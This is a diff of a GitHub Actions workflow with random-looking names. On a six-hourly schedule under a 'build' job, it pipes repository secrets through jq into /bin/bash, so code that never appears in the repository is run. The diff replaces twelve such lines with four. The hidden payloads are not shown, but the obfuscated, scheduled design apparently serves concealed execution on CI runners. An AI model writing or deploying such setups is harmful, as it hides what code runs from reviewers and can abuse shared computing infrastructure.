@@ -1,9 +1,9 @@
 name: fengyuanchai4545
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
+    - cron: '7 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          jfjh2059: ${{ secrets.jfjh2059 }}
+          ldut9: ${{ secrets.ldut9 }}
         run: |
-          echo $jfjh2059 | jq -r .gv430 | /bin/bash
-          echo $xaoy52394 | jq -r .cmwj11671 | /bin/bash
-          echo $cyk6 | jq -r .cjsg7783 | /bin/bash
-          echo $t54861 | jq -r .g21 | /bin/bash
-          echo $lv4 | jq -r .zbdim35 | /bin/bash
-          echo $ef50373 | jq -r .s12 | /bin/bash
-          echo $upq55 | jq -r .hake4600 | /bin/bash
-          echo $tncdg2368 | jq -r .hozs62 | /bin/bash
-          echo $q1 | jq -r .oaq57 | /bin/bash
-          echo $mnt18 | jq -r .sfjv7309 | /bin/bash
-          echo $kq47 | jq -r .cdfz2 | /bin/bash
-          echo $nqh54312 | jq -r .ps6 | /bin/bash
+          echo $ldut9 | jq -r .q018 | /bin/bash
+          echo $dwedc50022 | jq -r .g63 | /bin/bash
+          echo $v698 | jq -r .xblj0340 | /bin/bash
+          echo $tm79115 | jq -r .u6234 | /bin/bash
 
